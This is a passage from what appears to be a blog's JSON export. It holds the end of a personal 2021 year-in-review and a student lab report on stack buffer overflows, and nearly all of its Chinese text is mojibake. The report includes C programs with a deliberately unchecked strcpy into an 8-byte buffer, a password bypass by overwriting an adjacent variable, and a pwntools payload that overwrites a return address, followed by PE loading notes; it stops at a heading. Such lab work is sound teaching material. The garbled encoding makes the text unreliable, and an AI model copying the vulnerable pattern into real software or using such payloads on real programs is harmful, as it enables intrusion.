åœ¨Lordä½¬çš„å¸¦é£ä¸‹ï¼Œæ‹¿ä¸ªå¤©èä¿¡å°å¥–é¡¹ã€‚ æ”¶è·ä¸€æ‰¹å¾ˆä¸é”™çš„è¶³çƒå°ä¼™ä¼´ã€‚æœ€åä¹Ÿæ‹¿äº†ä¸€ä¸ªç½‘å®‰é™¢çš„å°è¶³çƒæ¯”èµ›çš„å† å†›ã€‚ å»é€›äº†ä»å°åˆ°å¤§ä¹¦æœ¬é‡Œè®°è½½é‡Œçš„é•¿åŸï¼Œåˆæ˜¥æ—¶åˆ»ï¼Œçœ‹å·å³¨çš„é•¿åŸå´å²–èœ¿èœ’ã€‚ åœ¨å­¦ä¸šä¸Šæœ‰äº†ç›¸å½“ç¨‹åº¦çš„ç²¾è¿›ï¼Œå¤§ä¸€æ—¶å€™å­˜åœ¨ä¸€å®šçš„æ‘†çƒ‚ï¼Œå› æ­¤å¤§ä¸€çš„æˆç»©ä¸ä¿ç ”æ— æœ›ï¼ŒåŒæ—¶äººé™…äº¤å¾€è¾ƒå°‘ï¼Œä½†æ˜¯å¤§äºŒé€šè¿‡æ‹…ä»»ç­çº§å­¦å§”ï¼Œå¯ä»¥è¯´æå¤§æ‹“å±•äº†äº¤å¾€çš„æœ‹å‹åœˆï¼Œä¹Ÿè®¤è¯†äº†å¯ä»¥ä¸€äº›å¯ä»¥ç›¸è¯†çš„æœ‹å‹ï¼Œæˆç»©ä¹Ÿæœ‰äº†ä¸€äº›å°çªç ´ï¼Œå¯ä»¥è¯´æ¯”è¾ƒæ¥è¿‘ä¿ç ”çš„åé¢ã€‚ äººé™…äº¤å¾€æ–¹é¢ï¼Œä¸ªäººæ€§æ ¼çš„ç¼ºç‚¹ç›¸å½“ä¸¥é‡ï¼Œè‡ªå‘å§ï¼Œä¹Ÿè®¸åªèƒ½åœ¨ç†Ÿäººé¢å‰èƒ½å¤Ÿå€¾åè‡ªå·±çš„æƒ³æ³•ï¼Œä½†æ˜¯è¿™ç§è®²è¯çš„æ–¹å¼å´åˆååˆ†çš„ä¸‘é™‹ï¼Œå¾€å¾€ä¼šæƒ¹å¾—å…¶ä»–äººä¸æ»¡ï¼Œç„¶åè‡ªå·±ä¹Ÿç›¸å½“ä¸çˆ½ï¼Œä½†æ˜¯è‡ªå·±ä¹Ÿåªèƒ½æŠŠæ‰€æœ‰å¿ƒäº‹åŸ‹åœ¨å¿ƒé‡Œï¼Œè‡ªå·±ä¸æ–­åœ°åæ€è‡ªå·±çš„é—®é¢˜ï¼Œä¹Ÿè®¸å°±æ˜¯è°¨è¨€æ…è¡Œå§ï¼Œè¯´è¯è¦æ‡‚å¾—ç¬¦åˆäº‹å®œã€ä¸èƒ½æ»¡å˜´è·‘ç«è½¦ï¼Œè¯´è¯æ–¹å¼ä¹Ÿæœ‰äº†æå¤§åœ°æ”¹å–„ã€‚ æ€§æ ¼æ–¹é¢ï¼Œè¿™ä¸€å¹´åº”è¯¥è¯´æˆé•¿äº†ä¸å°‘ï¼Œå› ä¸ºä»å°æ¥å—æ•™è‚²æ¯”è¾ƒå°é—­çš„é—®é¢˜ï¼Œåˆä¸­é«˜ä¸­çš„æ²Ÿé€šæ¯”è¾ƒå°‘ï¼Œå†…å‘è¿˜æ˜¯æœ‰çš„ã€‚è¿™ä¸€å¹´é€šè¿‡ä¸€äº›äº¤æµã€å¤–å‡ºæ¸¸ç©æ€§æ ¼åº”è¯¥æ˜¯å¼€æ”¾äº†ä¸€ç‚¹ã€æ•¢è¯´ï¼Œä¸å†æ˜¯è‡ªé—­å„¿ç«¥äº†ã€‚å…¶å®å§ï¼Œäººåº”è¯¥è‡ªä¿¡ä¸€ç‚¹ã€‚ æŠ€æœ¯æ–¹é¢ï¼šå­¦äº†çˆ¬è™«ã€ç®€å•çš„webå‰ç«¯ã€phpã€è¿˜æœ‰ä¸€äº›CTFçš„æ–¹å‘ã€‚ ç”Ÿæ´»ä¹ æƒ¯ï¼šç›¸å½“ä¸è‡ªå¾‹ï¼Œå¤§ä¸‰ä¸Šçš„åŠå¹´ä¸­æ¯æ™šå¹³å‡éƒ½æ˜¯ä¸€ç‚¹åŠä¹‹åç¡è§‰ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯äºŒç‚¹ä¹‹åæ‰æµ‘æµ‘å™©å™©çš„ç¡ç€ï¼Œæ˜¼å¤œä½œæ¯æåº¦ç´Šä¹±ï¼Œæ—©é¤åŸºæœ¬åŠå¹´æ²¡åƒè¿‡ä¸€æ¬¡ã€‚ BVBï¼Œç½—ä¼Šæ–¯æ‹¿ä¸‹äººç”Ÿä¸­ç¬¬ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„å† å†›å¤´è¡”ï¼šå¾·å›½æ¯ã€‚ 2021å¹´çš„é—æ†¾ æœ€å¤§çš„é—æ†¾åº”è¯¥æ˜¯å¤§å­¦ä¸¤å¹´åŠï¼Œå´ä»æœªå»è¿‡å·ç§°æ–‡åŒ–ç²¾åçš„æ•…å®«ï¼Œæ€»æ˜¯ä»¥å„ç§å„æ ·çš„åŸå› é¸½äº†æ•…å®«ï¼Œè¿™é‡Œç«‹ä¸€ä¸ªflag:2022å¹´åº¦æ— è®ºå¦‚ä½•éƒ½è¦çœ‹ä¸€çœ‹æ•…å®«çš„æ¨¡æ ·ã€‚ è¿˜æœ‰é—æ†¾å°±æ˜¯ï¼Œå¤§å­¦ç¬¬ä¸€æ¬¡ç›¸å¯¹æ­£å¼çš„è¶³çƒæ¯”èµ›ï¼Œæ ¡é•¿æ¯è¡¨ç°ç›¸å½“ç³Ÿç³•ï¼Œä¹Ÿè®¸ä¸€ç”Ÿä¸­ä¹Ÿå¾ˆéš¾å¿˜è®°è¿™åœºæ¯”èµ›ï¼Œæ€»è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å¿ƒæ€ç³Ÿç³•ï¼ŒæŠ€æœ¯ç³Ÿç³•ã€‚ è¿˜æœ‰å°±æ˜¯å¯¹äºæƒ³å­¦çš„æŠ€æœ¯å¾€å¾€ä¸èƒ½åšæŒåˆ°åº•ï¼Œæ„å¿—åŠ›ä¸å¤Ÿå¼ºå¤§ï¼Œä¸€ç›´å¯¹ç½‘ç»œå®‰å…¨æ–¹é¢çš„çŸ¥è¯†æ„Ÿå…´è¶£ï¼Œä½†æ˜¯æ€»æ˜¯ä¸‰å¿ƒäºŒæ„ã€‚ åœ¨ç›¸è¯†çš„äººä¸­ï¼Œèµ°ä¸¢äº†ä¸€äº›äººã€‚ä¹Ÿè®¸è¿™å°±æ˜¯äººç”Ÿå§ï¼Œå½“æœ‰äººæ„è§ä¸ä½ æƒ³å·¦çš„æ—¶å€™ï¼Œä½ ä¸èƒ½å¼ºè¿«æ‰€æœ‰äººéƒ½èƒ½è¾¾æˆå…±è¯†ï¼Œä¸æ˜¯æ‰€æœ‰äººçš„ä¸‰è§‚éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ€»æœ‰äººè¦ä¸‹è½¦ï¼Œä¹Ÿæ€»æœ‰äººè¦ä¸Šè½¦ï¼Œé™è§‚å…¶å˜ï¼Œéšå…¶é£å»å§ã€‚ æœ¬å­¦æœŸçš„ç›¸å½“ä¸€éƒ¨åˆ†ä½œä¸šä¸ºå°ç»„åˆä½œå½¢å¼ï¼Œå¾€å¾€ä¸èƒ½å¤Ÿæ­£å¸¸çš„åˆ†å·¥ã€åˆä½œã€å›¢é˜Ÿæ„è¯†è¿˜æ˜¯æ¬ ç¼ºã€‚ è¿˜æœ‰å°±æ˜¯å¯¹äºæƒ³è¦çš„ä¸æ•¢ç›´è¯´ï¼Œ(è¿™å°±æ˜¯å«è“„ï¼Ÿ)ï¼Œæ¯«æ— ç–‘é—®ï¼Œè¿™ä¸¢æ‰äº†ä¸€å¤§å †æƒ³è¦çš„ä¸œè¥¿ï¼Œå¯æœ›è€Œä¸å¯å³ã€‚ å¯¹äºå­¦å§”çš„å·¥ä½œï¼Œæœ‰ä¸€ç‚¹ç–²å€¦ï¼Œå¦‚æœå¯ä»¥ï¼Œä»»æœŸæ»¡çš„æ—¶å€™è€ƒè™‘è¾èŒã€‚ å¤§ä¸‰ä¸Šçš„åŠå¹´è¯¾è®¤è¯†åˆ°äº†é™¢é‡Œè€å¸ˆçš„ä¸€äº›æ°´å¹³ï¼Œæ˜¯æ—¶å€™è€ƒè™‘å¾€æ›´å¤§çš„æ–¹å‘è€ƒè™‘ã€‚ 2022 å¸Œæœ› 1ã€å»ä¸€æ¬¡æ•…å®« 2ã€åŠªåŠ›å­¦ä¹ æŠ€æœ¯ï¼Œæ‹¿åˆ°ä¸€ä¸ªå¿ƒä»ªçš„å®ä¹ offer 3ã€ç»§ç»­ä¸“å¿ƒå­¦ä¹ ï¼Œç¡®ä¿å­¦ä¸šèƒ½å¤Ÿæ‹¿åˆ°ä¿ç ”èµ„æ ¼ 4ã€å¯¹è¶³çƒæ›´ä¸Šå¿ƒå§ï¼Œç»ƒç»ƒæŠ€æœ¯ã€æ‹‰æ‹‰ä½“èƒ½ï¼Œäº‰å–èƒ½åœ¨æ ¡é•¿æ¯ä¸Šåœºå§ï¼Œæœ‰æ‰€è¡¨ç°å§ã€‚ 5ã€ç»§ç»­ç›®å‰çš„äººé™…äº¤å¾€ï¼Œå¦‚æœå¯ä»¥ï¼Œå¯ä»¥è®¤è¯†æ›´å¤šçš„æœ‹å‹ã€‚ 6ã€å»æ›´å¤šçš„åœ°æ–¹æ¸¸ç©ï¼Œå¸Œæœ›äº”ä¸€æˆ–å›½åº†å‡æœŸåˆ°å†…è’™æˆ–è€…é•¿æ²™ç©ä¸€æ¬¡ã€‚ æ€»ç»“ æ€»è€Œè¨€ä¹‹ï¼Œå°±æ˜¯ä»¥ä¸Šäº†ï¼Œè¿˜æ˜¯å¤ªçŸ«æƒ…äº†ï¼Œä½†æ˜¯å§ï¼Œäººæ€»è¦å€¾åä¸€ç‚¹ä¸œè¥¿ï¼Œ2021å°±è¿™æ ·å§ï¼Œ2021å°±åˆ°è¿™é‡Œäº†ã€‚\nå¸Œæœ›2022ä¼šæ›´å¥½ã€‚\n","permalink":"http://www.reus09.top/posts/life/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","summary":"2021 å°ç»“ å½“ä¸€ä¸ªäººååœ¨ç©ºæ— ä¸€äººçš„å®¿èˆé‡Œï¼Œä¹Ÿè®¸æ˜¯æ— èŠå§ï¼Œä¹Ÿè®¸æ˜¯çœ¼æ…•æœ‹å‹åœˆæ»¡å¤©é£çš„è·¨å¹´å°ç»“ï¼Œä¹Ÿè®¸æ˜¯çœ‹å„ç§æ¨é€çš„å¹´åº¦æ€»ç»“æœ‰æ„Ÿï¼Œå› æ­¤æ€»æƒ³å†™ç‚¹ä»€ä¹ˆä¸œè¥¿ï¼Œç‰¹","title":"2021å¹´åº¦æ€»ç»“"},{"content":"æ ˆæº¢å‡ºæŠ¥å‘Š 0x01 ç›®æ ‡ é€šè¿‡å¯¹ç¨‹åºè¾“å…¥çš„å¯†ç çš„é•¿åº¦ã€å†…å®¹ç­‰ä¿®æ”¹ç”¨Ollydbgæ¥éªŒè¯ç¼“å†²åŒºæº¢å‡ºçš„å‘ç”Ÿï¼ˆå‚è€ƒæä¾›çš„ä¸¤ä¸ªä»£ç ï¼‰ å®Œæˆæ·¹æ²¡ç›¸é‚»å˜é‡æ”¹å˜ç¨‹åºæµç¨‹å®éªŒ å®Œæˆæ·¹æ²¡è¿”å›åœ°å€æ”¹å˜ç¨‹åºæµç¨‹å®éªŒ é™„åŠ é¢˜ ä»¥StackOverrunç¨‹åºä¸ºé¶å­ï¼Œé€šè¿‡è‡ªå·±ä½¿ç”¨ollydbgè°ƒè¯•ï¼Œä¸¤ä¸ªè¦æ±‚ï¼šå…¶ä¸€ï¼Œè¦æ±‚åˆ†æPEæ ¼å¼åŠ è½½åˆ°å†…å­˜ä¸­çš„åœ°å€å˜åŒ–ï¼›å…¶äºŒï¼ŒæŒ‘é€‰å…¶ä¸­ä¸€å¤„å‡½æ•°çš„è·³è½¬ï¼Œè¯¦ç»†åˆ†æï¼Œè·³è½¬æ—¶spï¼Œbpï¼Œipçš„å˜åŒ–ï¼Œè¦æ±‚ä»¥ç¨‹åºè¿è¡Œçš„é¡ºåºè®°å½•è·³è½¬æ—¶çš„è¿™äº›å¯„å­˜å™¨çš„å˜åŒ–ã€‚ åœ¨æ²¡æœ‰æºä»£ç çš„æƒ…å†µä¸‹ï¼Œå…ˆæ¨æµ‹ç¨‹åºçš„åŠŸèƒ½ï¼Œç„¶åå°è¯•ä¿®æ”¹StackOverrunç¨‹åºçš„æµç¨‹ï¼Œé€šè¿‡æ·¹æ²¡è¿”å›åœ°å€ï¼Œæ¯”å¦‚å¯ä»¥å°è¯•ç”¨jmp espçš„æ–¹å¼ï¼ˆæ–¹å¼å¯ä»¥è‡ªé€‰ï¼‰ï¼Œè®©å…¶è°ƒç”¨barå‡½æ•°å¹¶è¾“å‡ºç»“æœã€‚ 0x02 æµ‹è¯•æ­¥éª¤å’Œç»“æœ 2.1 overflow_var æ·¹æ²¡ç›¸é‚»å˜é‡ 2.1.1 æºç åˆ†æ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8];// add local buff authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; while(1) { printf(\u0026#34;please input password: \u0026#34;); scanf(\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); break; } } system(\u0026#34;pause\u0026#34;); } ç¨‹åºè¾“å…¥ä¸€ä¸ªpassoword,ç„¶åä½œä¸ºå‚æ•°å°†å…¶ä¼ é€’ç»™å‡½æ•°verify_passwordå‡½æ•°é‡Œé¢\nåœ¨verify_passwordå‡½æ•°é‡Œé¢åˆ›å»ºä¸¤ä¸ªå±€éƒ¨å˜é‡ï¼Œauthenticatedå‚æ•°æœ€åä½œä¸ºè¿”å›ï¼Œbufferå‚æ•°å­˜å‚¨ä¼ é€’è¿›æ¥çš„passwordï¼Œ\nauthentiactedå‚æ•°å­˜å‚¨passwordå’Œå®šä¹‰å¥½çš„å…¨å±€å˜é‡PASSWORDçš„ç»è¿‡strcmpå‡½æ•°ä¹‹åçš„è¿”å›å€¼ï¼Œæœ€åç¨‹åºè¿”å›authentiactedã€‚\nå›åˆ°mainå‡½æ•°ä¹‹åï¼Œvalid_flagå­˜å‚¨çš„ä¸ºä¸Šé¢çš„è¿”å›å€¼ï¼Œå¦‚æœè¾“å…¥ç›¸åŒï¼Œå³è¾“å‡ºincorrect password!\\n\\n,å…¶ä»–æƒ…å†µï¼Œè¾“å‡ºCongratulation! You have passed the verification!\\nã€‚\næ‰§è¡Œç¨‹åºæ•ˆæœå¦‚å›¾ï¼š\n2.1.2 ollydbgè°ƒè¯•åˆ†æ é€šè¿‡IDAåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šmainå‡½æ•°åœ°å€ä¸º0x4010A0 ç›´æ¥åœ¨ollydbgä¸­è®¾ç½®æ–­ç‚¹ï¼Œç„¶åä½¿ç¨‹åº è¿è¡Œåˆ°è¯¥ä½ç½® local.1å³ä¸ºvalid_flagçš„å‚æ•°å€¼ mov eax,0x01 test eax,eaxå³ä¸ºå®ç°while(1)å¾ªç¯ æ¥ä¸‹æ¥printf,scanfï¼Œverify_passwordå‡½æ•°å‡å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚ è¿›å…¥å‡½æ•°0x401440è¿›è¡Œåˆ†æ æˆ‘ä»¬é¦–å…ˆè¾“å…¥å¯†ç 123456 è¿›å…¥å‡½æ•°åˆ†æ å‘ç°æˆ‘ä»¬eaxå­˜å‚¨çš„ä¸ºæˆ‘ä»¬è¾“å…¥çš„å¯†ç 123456, ç¨‹åºå°†PASSWORDå’Œeaxè¿ä¸ªå‚æ•°çš„åœ°å€å‡å‹å…¥æ ˆä¸­ã€‚ çœŸå®çš„bufferå­˜å‚¨åœ¨åœ°å€0x188FB44 å¯ä»¥çœ‹åˆ°ç»è¿‡å‡½æ•°strcmpä¹‹åçš„è¿”å›å€¼å­˜å‚¨åœ¨eaxé‡Œé¢ï¼Œç„¶åèµ‹å€¼ç»™[local.1] ç„¶åbufferåœ°å€ä¸º0x18FAE0 è¿›è€Œæˆ‘ä»¬å‘ç°authenticatedå‚æ•°çš„åœ°å€å³ä¸º0x18FAE8ï¼Œå¹¶ä¸”å› ä¸ºæ˜æ˜¾123456å°äº1234567ï¼Œæ‰€ä»¥å‚æ•°è¢«è¦†ç›–ä¸º0xFFFFFFFF è¾“å…¥å¯†ç 1234567 æˆ‘ä»¬å‘ç°authenticatedå‚æ•°çš„åœ°å€å³ä¸º0x18FAE8ï¼Œå¹¶ä¸”å› ä¸ºæ˜æ˜¾123456å°äº1234567ï¼Œæ‰€ä»¥å‚æ•°è¢«è¦†ç›–ä¸º0x00000000 2.1.3 æ·¹æ²¡ç›¸é‚»å˜é‡ å› ä¸ºå­å‡½æ•°verify_passwordè¿”å›çš„å€¼ä¸ºauthenticatedçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¦†ç›–æ‰è¿™ä¸ªå‚æ•°ï¼Œå°†å…¶è¦†ç›–ä¸º0å³å¯ï¼Œæ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ è€ƒè™‘åˆ°å†…å­˜ä¸­å°ç«¯å­˜å‚¨çš„ç‰¹ç‚¹ï¼ŒåŠ ä¸Šbufferç©ºé—´çš„å¤§å°ä¸º8å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥å…«ä¸ªå­—ç¬¦ï¼Œè®©å­—ç¬¦ä¸²çš„æˆªæ–­ç¬¦nullè¦†ç›–æ‰å‚æ•°authenticatedå³å¯æ»¡è¶³æ¡ä»¶ã€‚ æˆ‘ä»¬è¿™é‡Œè¾“å…¥å¯†ç 123456# ç”¨ollydbgçœ‹ä¸€ä¸‹æ ˆä¸­å†…å®¹å˜åŒ– å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å‚æ•°è¢«è¦†ç›–ä¸º0äº†ã€‚åŒæ—¶ç¨‹åºè¾“å‡º 2.2 overflow_ret æ·¹æ²¡è¿”å›åœ°å€ 2.2.1 æºç åˆ†æ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; FILE * fp; if(!(fp=fopen(\u0026#34;password.txt\u0026#34;,\u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp,\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); } fclose(fp); } ç¨‹åºå®ç°ï¼Œè¯»å–æ–‡ä»¶password.txtçš„å†…å®¹ä½œä¸ºpassword\nç„¶åå°†passwordä½œä¸ºå‚æ•°ä¼ é€’ç»™verify_passwordå‡½æ•°\nå…¶ä½™çš„åˆ†æè¿‡ç¨‹ä¸ä¸Šè¿°æ²¡æœ‰åŒºåˆ«ï¼Œä¸åœ¨èµ˜è¿°\npassword.txtå¡«å……123456\npassword.txtå¡«å……1234567\n2.2.2 IDA_PROåˆ†æ æˆ‘ä»¬è¿™é‡Œéœ€è¦è¦†ç›–æ‰å­å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå°†å…¶è¿”å›åœ°å€æ”¹ä¸ºæ‰“å°å‡ºCongratulation! You have passed the verification!\\n. è¿™é‡Œæˆ‘ä»¬é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹å­å‡½æ•°verify_passwordçš„æ ˆç©ºé—´ï¼Œbufferå¤§å° IDA-PROæˆ‘ä»¬è¿›å…¥å­å‡½æ•°ï¼Œå°†å…¶åæ±‡ç¼– v3å³ä¸ºbufferå˜é‡ï¼Œv4ä»£è¡¨authenticated æŸ¥çœ‹v3åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒæƒ…å†µ è€ƒè™‘åˆ° strcpyå‡½æ•°å¹¶æ²¡æœ‰æ£€éªŒèµ‹å€¼çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œå› æ­¤å­—ç¬¦ä¸²å¯ä»¥æº¢å‡ºã€‚ å‘ç°bufferæ•°ç»„å¡«å……0x0c+0x04ä¸ªå­—ç¬¦å³å¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ã€‚ è¿™é‡Œæ‰¾åˆ°è¿”å›åœ°å€ä¸º0x40112f 2.2.3 æ·¹æ²¡è¿”å›åœ°å€ æ ¹æ®ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æ ¹æ®pwntoolså†™å‡ºç›¸åº”çš„shellcode\n1 2 3 4 5 6 7 from pwn import * ret = 0x40112f payload = b\u0026#39;a\u0026#39;*0x10 + p32(ret) with open(\u0026#34;password.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) å¯ä»¥æ¯”è¾ƒæ¸…æ™°çš„çœ‹åˆ°ebpè¢«è¦†ç›–ä¸ºaaaa,è¿”å›åœ°å€ä¹Ÿè¢«è¦†ç›–ä¸º0x40112f\n0x03 æµ‹è¯•ç»“è®º æˆ‘ä»¬é€šè¿‡æ ˆæº¢å‡ºä¸¤ä¸ªä¾‹å­ï¼Œåˆ†åˆ«è¦†ç›–è¿”å›åœ°å€å’Œç›¸é‚»å…³é”®å˜é‡ï¼Œé€šè¿‡strcpyå¯¹æ•°ç»„è¾¹ç•Œçš„æ²¡æœ‰è¦æ±‚ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æˆåŠŸçš„è¾¾åˆ°ç›®æ ‡ã€‚ è¿™å……åˆ†è¯æ˜æˆ‘ä»¬åœ¨å®é™…ç¼–ç¨‹ä¸­è¦ä½¿ç”¨å®‰å…¨çš„å‡½æ•°s_scanfæˆ–è€…å®‰å…¨çš„strcpyå‡½æ•°ï¼Œå¦åˆ™å®¹æ˜“é€ æˆä¸¥é‡çš„æ ˆæº¢å‡ºæ”»å‡»ã€‚ åŒæ—¶å‘¢ï¼Œé€šè¿‡æ ˆæº¢å‡ºæˆ‘ä»¬å¯ä»¥åŠ«æŒç¨‹åºçš„EIPæ¥åˆ°æˆ‘ä»¬æƒ³è¿è¡Œçš„ä»»ä½•ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ¶æ„ä¿®æ”¹ä¸€äº›å…³é”®å‚æ•°æ¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ ç®€è¿°ä¸€ä¸‹è¦†ç›–ç›¸é‚»å˜é‡åŸç† è¿™é‡Œæˆ‘ä»¬é€šè¿‡è¶Šè¿‡æ•°ç»„bufferçš„è¾¹ç•Œï¼Œ åˆ©ç”¨å­—ç¬¦ä¸²çš„æˆªæ–­ç¬¦\\x00æ¥è¦†ç›–æ‰å‚æ•°authenticatedï¼Œä»è€Œä¿è¯å°†å…¶è¿”å›å€¼ä¿®æ”¹æ’ä¸º0ã€‚ ç®€è¿°ä¸€ä¸‹è¦†ç›–èŒƒæ¹–åœ°å€åŸç† æˆ‘ä»¬è¿™é‡Œç›´æ¥åˆ©ç”¨è¶…é•¿çš„ bufferå­—ç¬¦ä¸²ï¼Œè¦†ç›–æ‰æ•´ä¸ªbuffer,å‚æ•°authenticatedï¼Œebp,å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬éœ€è¦çš„åœ°å€0x40112f 0x04 é™„åŠ é¢˜ 4.1 é™æ€åˆ†æ ä½¿ç”¨IDA_Proæ‰“å¼€ç¨‹åºè¿›è¡Œé™æ€åˆ†æ\né¦–å…ˆæ‰“å°ä¸¤ä¸ªå‡½æ•°çš„åœ°å€0x401000,0x401060,ç„¶åå°†argv[1]ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°sub_101000 ç„¶åè¿›å…¥å‡½æ•°sub_401000æŸ¥çœ‹å‡½æ•°åŠŸèƒ½ å°†è¾“å…¥çš„å‚æ•°èµ‹å€¼ç»™v2ï¼Œç„¶åæ‰“å°èµ‹å€¼ å‰åä¸¤æ¬¡çš„æ ˆå†…ç©ºé—´å˜åŒ–ã€‚ è¿›å…¥å‡½æ•°sub_401060æŸ¥çœ‹å‡½æ•°åŠŸèƒ½ æ‰“å°å‡ºi have been hackedï¼ åœ¨ollydbgä¸­ï¼Œå°†å‚æ•°èµ‹å€¼ä¸ºtestï¼ŒæŸ¥çœ‹å…·ä½“åŸç†\nç¬¬ä¸€æ¬¡æ‰“å°æ ˆä¸­å†…å®¹ èµ‹å€¼åæ‰“å°æ ˆä¸­å†…å®¹ 4.2 PEåŠ è½½å†…å­˜åœ°å€å˜åŒ– æˆ‘ä»¬ç”¨010editoråˆ†æä¸€ä¸‹æ²¡æœ‰åŠ è½½æƒ…å†µä¸‹çš„ç¨‹åº ç›¸å¯¹åº”çš„textã€rdataã€dataæ®µåœ°å€åˆ†åˆ«ä¸º0x401000,0x405000,0x406000 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°PEç»“æ„åˆ†ä¸ºå››éƒ¨åˆ† å…¶ä¸­Sections åˆ†ä¸ºtext,data,rdataå‡ éƒ¨åˆ†ã€‚ 0x1000hä¹‹å‰çš„æ•°æ®éƒ½æ˜¯ç”¨äºç¨‹åºåŠ è½½ç”¨çš„ï¼Œç”¨äºæ£€éªŒPEæ–‡ä»¶æ ¼å¼ï¼Œè®¡ç®—æ–‡ä»¶åç§»ã€‚ æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹å†…å­˜æ˜ åƒç»“æ„ å› ä¸ºç¨‹åºåŠ è½½ç”¨åˆ°ç›¸å¯¹è™šæ‹Ÿåœ°å€,exeä¸º0x400000, textæ®µå¼€å¤´ä¸åŠ è½½åçš„å¯¹æ¯” å¯ä»¥çœ‹åˆ°å­—èŠ‚ç æ˜¯å¯¹åº”çš„ æˆ‘ä»¬å‘ç°å­—ç¬¦ä¸²é™æ€ä¸‹çš„æƒ…å†µä½äºdata æ®µ è¿™é‡Œä»¥Now the stack looks like: å› æ­¤è¿™é‡ŒåŠ è½½åçš„åœ°å€å³ä¸º0x400000+0x6030 æ€»è€Œè¨€ä¹‹ RVAæ˜¯åœ¨PEæ–‡ä»¶ä¸­ä¸ºäº†é¿å…ä½¿ç”¨ç¡®å®šçš„å†…å­˜åœ°å€ï¼Œå‡ºç°äº†ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRelative Virtual Addressï¼Œç®€ç§°RVAï¼‰ â€“ RVAæ˜¯å†…å­˜ä¸­ç›¸å¯¹äºPEæ–‡ä»¶è£…å…¥åœ°å€çš„åç§»ä½ç½®ï¼Œæ˜¯ä¸€ä¸ªâ€œç›¸å¯¹åœ°å€â€ï¼Œæˆ–ç§°ä¸ºâ€œåç§»é‡ VAæŒ‡çš„æ˜¯è¿›ç¨‹è£…å…¥å†…å­˜åå®é™…çš„å†…å­˜åœ°å€ï¼Œè¢«ç§°ä¸ºè™šæ‹Ÿåœ°å€ï¼ˆVirutal Addressï¼Œç®€ç§°VAï¼‰ VA=Image Base + RVA 4.3 å‡½æ•°è·³è½¬å¯„å­˜å™¨å˜åŒ– è¿™é‡Œä¹Ÿä»¥å‚æ•°testä¸ºä¾‹å­ï¼Œåˆ†æä¸€ä¸‹è¿›å…¥fooå‰åæ ˆå¸§çš„å˜åŒ– è¿™é‡Œå‘ç°æ ˆé¡¶espå­˜å‚¨çš„ä¸ºtest,eipæ­¤æ—¶æŒ‡å‘çš„ä¸ºcall fooï¼ŒebpæŒ‡å‘mainå‡½æ•°çš„æ ˆå¸§åº•éƒ¨ã€‚ è¿›å…¥fooå‡½æ•° ä¸€ç³»åˆ—å…¥æ ˆæ“ä½œ å‘ç°è¿™ä¸ªå‡½æ•°æ²¡æœ‰è¿›è¡Œebpå¤„ç†ï¼Œ æ‰€ä»¥ebpä»ç„¶ä¸ºmainå‡½æ•°çš„æ ˆåº• ä½†æ˜¯espç»è¿‡ä¸€ç³»åˆ—çš„æ›´æ–°ï¼Œè¿›ä¸€æ­¥çš„å‘ä¸Šæ‰©å¼ ï¼ŒåŒæ—¶eipæŒ‡å‘fooå‡½æ•°çš„å½“å‰æŒ‡ä»¤ æ‰§è¡Œå®Œfooå‡½æ•°ä¹‹åï¼Œå›åˆ°mainå‡½æ•° å‘ç°esp,ebpå›åˆ°è¿›å…¥fooå‡½æ•°ä¹‹å‰çš„æ ·å­ï¼Œeipæ‰§è¡Œè°ƒç”¨callæŒ‡ä»¤ä¹‹åçš„ä¸‹ä¸€æ¡åœ°å€0x40109B 4.4 æ ˆæº¢å‡ºè°ƒç”¨bar 